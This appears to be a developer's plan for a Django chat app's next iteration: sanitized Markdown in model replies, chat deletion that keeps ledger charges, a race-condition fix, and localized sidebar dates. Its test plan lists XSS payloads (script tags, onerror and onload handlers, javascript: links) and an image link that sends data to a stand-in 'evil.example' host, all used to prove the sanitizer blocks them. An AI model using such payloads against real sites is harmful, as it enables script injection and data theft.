# Plan: Loop 5: safe Markdown replies, deleting chats, and sidebar dates

- **Date:** 2026-09-29 (Unix 1790681656)
- **Source study:** `doc/study/1790678621-loop5-markdown-delete-dates.md` (decisions in §5)
- **Builds on:** loop 4 on `main` (wiki `chat.md`, `billing.md`)
- **Branch:** `loop5-markdown-delete-dates`, off `main`. Don't merge during execute.
  Wait for the rendezvous command.
- **Scope:**
  - Render assistant replies as sanitized Markdown with **markdown-it-py + nh3**.
  - Delete a chat through a **confirmation page**. Its **charges stay in the ledger**,
    with no refund, and My Profile gets a **"Deleted chats"** line.
  - Fix the **delete-while-replying** race: the charge is recorded and the request returns
    404.
  - Show each chat's **last-activity date**, relative, in the **user's time zone**, under
    its title in the sidebar.
- **Not in this loop** (study §5 #5): syntax highlighting, autolinks, images and math in
  Markdown; soft delete and undo.
- **Unchanged:**
  - Charging, 402, the 120 s timeout and the 502/503 mapping.
  - Raw Markdown is what's stored and resent to models.
  - User bubbles stay plain text.
  - The ledger is append-only (no charge row is ever edited).
- **No model changes, so no migrations** are expected.

## Security rules for rendered Markdown

These are the rules the tests enforce.

- **Parser:** `MarkdownIt("commonmark", {"html": False}).enable(["table",
  "strikethrough"]).disable("image")`.
  - Raw HTML is escaped.
  - `javascript:`, `vbscript:`, `file:` and `data:` links are rejected.
  - An image becomes a plain link.
- **Sanitizer:** `nh3.clean(...)`, applied to the parser's output every time:
  - `tags = {p, br, strong, em, s, del, code, pre, blockquote, ul, ol, li, h1, h2, h3,
    h4, h5, h6, hr, a, table, thead, tbody, tr, th, td}`
  - `attributes = {"a": {"href", "title"}, "code": {"class"}}`, with an
    `attribute_filter` so `code[class]` only keeps values matching
    `^language-[A-Za-z0-9_+-]+$`
  - `url_schemes = {"http", "https", "mailto"}`
  - `link_rel = "noopener noreferrer nofollow"`
- **No `style` attribute anywhere.** markdown-it-py emits `style="text-align:…"` on
  aligned table cells, but `style` is itself an exfiltration channel
  (`background:url(…)`), so it's stripped. Tables lose column alignment, which is an
  accepted cost.
- **No `<img>`**, whatever the source (the parser rule is off, and it's not in the
  allowlist).
- `mark_safe` is applied **only** to `nh3.clean(...)` output, in one function.

---

## Step 0: Branch

- [ ] `git switch -c loop5-markdown-delete-dates` from an up-to-date `main`.

## Step 1: `build: add markdown-it-py and nh3 for safe Markdown`

- [ ] `requirements.txt`: add `markdown-it-py>=4,<5` and `nh3>=0.3,<0.4`. The study
      (§2.3) records the justification. `mdurl` comes in transitively.
- [ ] Install them in `.venv`. `python manage.py check` passes.
- [ ] Commit.

## Step 2: `feat: render Markdown in model replies safely`

- [ ] `chat/markdown.py`:
  - A module-level parser, configured as above.
  - `ALLOWED_TAGS`, `ALLOWED_ATTRIBUTES` and `_attribute_filter`.
  - `render_markdown(text) -> SafeString` returns
    `mark_safe(nh3.clean(md.render(text or ""), …))`.
- [ ] `chat/templatetags/chat_markdown.py`: a `markdown` filter that calls
      `render_markdown`.
- [ ] `_message.html`: an **assistant** bubble renders `<div class="bubble-text md">{{
      message.content|markdown }}</div>`. A **user** bubble keeps `{{
      message.content|linebreaksbr }}`. The empty safety-block note stays.
- [ ] CSS in `base.html` for `.md`:
  - `p` and list margins; `ul`/`ol` padding
  - inline `code` in monospace with a light background
  - `pre` with a background, padding, `overflow-x: auto` and `white-space: pre`
  - `table` with `display: block; overflow-x: auto`, and borders and padding on
    `th`/`td`
  - `h1`–`h6` scaled to 1.0–1.2rem
  - a `blockquote` left border
  - links with `overflow-wrap: anywhere`
  - no `img` rules needed
- [ ] Tests (`chat/tests.py`, a new `MarkdownTests` class, plus a view-level class with
      mocked replies):
  - [ ] **The XSS corpus through `render_markdown`**, each checked by **parsing** the
        output (`html.parser`):
    - raw `<script>`, `<img src=x onerror=…>`, `<iframe>`, `<svg onload=…>`, `<style>`
    - raw `<a href="javascript:…">`
    - Markdown links to `javascript:`, to an entity-encoded `javascript:`, and to
      `data:text/html`
    - an autolink `<javascript:…>`
    - an image `![a](https://evil.example/?q=secret)`
    - a table whose aligned column would carry `style`
    - fenced code with `class="language-x onmouseover=…"`-style injection

    The rule for every case: no element outside the allowlist, no `on*` or `style`
    attribute, no `src`, every `href` is `http(s)`/`mailto`, and every `code[class]`
    matches `language-…`.
  - [ ] Features: `**bold**`, `*em*`, `~~strike~~`, `-` and `1.` lists, inline code,
        fenced code (content escaped, so `<b>` appears as `&lt;b&gt;`), a table (with
        `thead`/`tbody`), a blockquote, and a link, which gets
        `rel="noopener noreferrer nofollow"`.
  - [ ] **The same corpus through the views:**
    - the chat page (form mode)
    - the JSON `messages_html` for an existing chat
    - the JSON `main_html` for a new chat

    Each uses a mocked proxy reply containing the payload, and each passes the same
    parsed audit, limited to the thread.
  - [ ] Stored content is **raw**: `Message.content` equals the model's Markdown, and
        the next request's history resends it unchanged.
  - [ ] User bubbles aren't rendered: a user message `**hi**` shows literally.
  - [ ] The existing tests still pass: escaping, no costs on chat pages, the safety note.
- [ ] Commit.

## Step 3: `feat: delete chats with a confirmation page`

- [ ] View `chat_delete` at `/chats/<id>/delete/` (`chat_login_required`,
      `require_http_methods(["GET", "POST"])`):
  - Not the owner, or unknown → **404**.
  - **GET** → 200. It renders `chat/confirm_delete.html` (extends `base.html`):
    - the heading: Delete "title"?
    - the text: "This deletes the chat and its messages. It can't be undone. Charges
      for its replies stay in your usage history on My Profile."
    - a **Delete** button (POST, with the CSRF token) and a **Cancel** link back to the
      chat
  - **POST** → `conversation.delete()`, which cascades to its messages. Each charge's
    `message` link becomes NULL (`SET_NULL`), and **no ledger row is edited or added**.
    Then add the message "Chat deleted." and **302** to `/chats/`.
  - Other methods → 405. Logged out → 302 to log-in.
- [ ] Sidebar (`_sidebar.html`): each row becomes
      `<li class="chat-row"><a class="chat-link" href="…" [aria-current]><span
      class="chat-title">…</span></a><a class="chat-delete" href="…/delete/"
      aria-label="Delete “title”">×</a></li>`. The date is added in Step 4. CSS: the ×
      shows on row hover or focus-within from 721px up, and is always visible at 720px
      and below.
- [ ] Chat header (`_main.html`): a **Delete** link next to Rename.
- [ ] **In-flight race fix** (`chat/services.py`). Inside the atomic block, when
      `conversation` was passed:
  - re-check with `Conversation.objects.filter(pk=conversation.pk).exists()`
  - if it's gone, post the **charge only**:
    `post_transaction(user, -cost, "charge", note=f"Reply in deleted chat
    “{conversation.title}”", message=None)`
  - save no messages, and raise `ConversationDeleted`, a new exception in
    `chat/services.py`

  Backstop: if saving still fails with `DatabaseError` or `IntegrityError` because the
  chat vanished between the check and the writes, roll back, record the same charge in a
  fresh `transaction.atomic()`, and raise `ConversationDeleted`.
- [ ] Views: in `chat_detail`, `ConversationDeleted` → **404**. Form mode renders the 404
      page. JSON mode returns `{"error": "This chat was deleted."}`, and the script
      already shows JSON errors and restores the draft.
- [ ] **My Profile, "Deleted chats" line:**
  - `deleted = ledger.filter(kind="charge", message__isnull=True).aggregate(total=Sum,
    count=Count)`
  - when the count is above 0, show it after the usage list as a card: "Deleted chats ·
    N replies · $X", using `dollars_precise`
  - the per-chat totals plus the deleted-chats total then equal "Spent on replies"
- [ ] Update the existing tests that assert the old sidebar markup
      (`aria-current="page">…</a>`) to the new `chat-link` structure.
- [ ] Tests:
  - [ ] GET confirm → 200, showing the title, the warning text and a POST form.
        Another user's chat → 404 (GET and POST). An unknown id → 404. Anonymous → 302
        to log-in. PUT → 405.
  - [ ] POST delete → 302 to `/chats/`. The conversation and its messages are gone.
        **The charge rows remain, with `message` NULL, and the same amounts and notes.
        The balance is unchanged, and `balance == sum(ledger)` still holds.** No new
        ledger rows.
  - [ ] After deleting, `/chats/` opens the next most recent chat, or New chat if none
        is left. The sidebar no longer lists the deleted chat.
  - [ ] My Profile shows "Deleted chats · 2 replies · $…" with the right total, and
        (per-chat totals + deleted total) == total spent. With no deletions, there's no
        line.
  - [ ] The sidebar has a × delete link per chat (with `aria-label`), and the header
        has a Delete link, both pointing at `chat_delete`.
  - [ ] **The race, form and JSON modes:** a mocked `llm.complete` deletes the
        conversation and then returns a reply.
    - the response is **404** ("This chat was deleted." in JSON)
    - **exactly one new charge** is recorded, with `message` NULL and the "Reply in
      deleted chat …" note
    - no messages are saved
    - the balance drops by the cost
    - there's no 500
  - [ ] The backstop path: force the `exists()` check to pass, and delete on the first
        write. The result is still one charge and a 404.
- [ ] Commit.

## Step 4: `feat: show each chat's date in the sidebar`

- [ ] `_sidebar.html`: inside each `chat-link`, under the title, add
      `<time class="chat-date" datetime="{{ c.updated_at|date:'c' }}" data-relative
      title="{{ c.updated_at|date:'M j, Y H:i' }} UTC">{{ c.updated_at|date:'M j, Y'
      }}</time>`. The server fallback is the UTC date.
- [ ] Script (`_script.html`), `localizeTimes(root)`: for each `time[data-relative]`,
      read `datetime` and format it **in the browser's time zone** with built-in
      `Intl.DateTimeFormat("en-US", …)`, comparing local calendar days:
  - same day → the time `HH:MM` (24-hour, `hourCycle: "h23"`)
  - the previous day → `Yesterday`
  - 2–6 days ago → the short weekday (`Mon`)
  - the same year → `Sep 3`
  - otherwise → `Sep 3, 2025`
  - a future timestamp (clock skew) → treated as today

  Then set `title` to the full local date and time.

  Call it on load, after `replaceSidebars()`, and after the `main_html` swap (which
  contains the mobile sidebar copy).
- [ ] CSS: `.chat-date` is small and muted, on its own line under the title, and the
      title keeps its ellipsis.
- [ ] Tests (Django, server side):
  - [ ] Each sidebar row has `<time datetime="<ISO of updated_at>" data-relative>` with
        the UTC fallback text. Rows are newest first by `updated_at`.
  - [ ] A send bumps that chat's `updated_at`, so its `datetime` changes and it moves to
        the top. A rename doesn't change it.
  - [ ] The JSON `sidebar_html` contains the `<time>` elements.
  - [ ] The script defines `localizeTimes` and calls it after `replaceSidebars` and
        after the `main_html` swap. This is a string check on the inline script.
- [ ] **A formatter check under Node** (verify step, in the scratchpad, not in the repo):
      extract `relativeLabel(date, now)` from the script and run it under
      `TZ=America/Los_Angeles`, `TZ=Asia/Tokyo` and `TZ=UTC`, with fixed dates:
  - today → a time
  - just before local midnight versus just after
  - yesterday; 3 days ago → a weekday
  - earlier this year → `Sep 3`
  - last year → `Sep 3, 2025`
  - A UTC timestamp near midnight must land on the correct *local* day in each zone.
- [ ] Commit.

## Step 5: `chore: update README for Markdown, deleting chats and dates`

- [ ] Using the app:
  - [ ] Replies render Markdown (bold, lists, code, tables). Images and raw HTML are
        never rendered.
  - [ ] Delete a chat with the × in the sidebar or Delete in its header, then confirm.
        Its charges stay on My Profile under "Deleted chats", and nothing is refunded.
  - [ ] Sidebar dates are last activity, in your time zone.
- [ ] Update the status note to loop 5.
- [ ] Commit.

## Step 6: Verify the whole loop (no commit)

- [ ] `check` passes, `makemigrations --check` shows **no changes**, and all tests pass
      with no real HTTP.
- [ ] `migrate` on the dev DB → "No migrations to apply". Never reset.
- [ ] Live server on `0.0.0.0:8000`: GET `/`, `/models/` → 200. The chat pages,
      `/profile/` and `/chats/<id>/delete/` → 302 when anonymous.
- [ ] The Node formatter check above, across three time zones.
- [ ] **Real proxy, all three models** (on a throwaway DB, JSON mode, one retry per
      call). Ask "Reply with a two-row Markdown table, a bulleted list, some **bold**
      text and a short fenced Python code block."
  - [ ] The rendered thread contains `<table>`, `<ul>`, `<strong>` and `<pre><code>`.
  - [ ] The parsed security audit passes on the real output.
  - [ ] The stored content is raw Markdown, and the charges match the formula.
- [ ] **Browser check** (headless Chrome over DevTools; `uitest` on the dev DB, already
      authorized):
  - [ ] Send the Markdown request above in a new chat. The reply shows a real table,
        list, bold text and a code block, with no reload. Take a screenshot and look at
        it.
  - [ ] Sidebar dates: the new chat shows today's time, and the labels are localized.
        Run once with the browser's time zone overridden
        (`Emulation.setTimezoneOverride` to `Asia/Tokyo`) and check the label changes
        accordingly.
  - [ ] Delete flow: × on a sidebar row → the confirmation page → Delete. The chat is
        gone from the sidebar, "Chat deleted." shows, the nav balance is unchanged, and
        My Profile shows the "Deleted chats" line. Take screenshots of the confirmation
        page and My Profile.
  - [ ] Phone width (375px): the × is visible, dates show, and there's no horizontal
        scroll. Take a screenshot.
- [ ] `git status` is clean. `git log main..loop5-markdown-delete-dates --oneline` shows
      five commits. Stop and wait for **rendezvous**.

## Risks

- **Rendering cost:** Markdown is rendered on every page view. Each reply takes about
  1 ms, which is negligible at this scale. Caching can come later if it's ever needed.
- **Tables lose column alignment**, because `style` is stripped for safety.
- **Links in replies are clickable.** Prompt-injected links still need a click, and they
  carry `rel="noopener noreferrer nofollow"`. Images, which would load automatically,
  are never rendered.
- **No-JS users see UTC dates** in the sidebar. The full UTC date and time is in the
  tooltip.
- **The race backstop relies on catching the failed write.** It's covered by a test that
  forces that path.

## Done when

- Assistant replies render bold, italics, lists, code and tables, and a tested corpus
  shows no script, event handler, style, image or non-http(s)/mailto link can reach the
  page, in any response mode.
- Users can delete a chat from the sidebar or header via a confirmation page. Its
  messages are gone, its charges stay in the ledger unchanged with no refund, and My
  Profile's "Deleted chats" line keeps the totals reconciled.
- Deleting a chat while a reply is in flight records that reply's charge and returns 404.
  There's never a 500 or a lost charge.
- The sidebar shows each chat's last-activity date, relative, in the user's time zone.
- Two new dependencies (markdown-it-py, nh3) are declared in `requirements.txt`. There
  are no migrations.
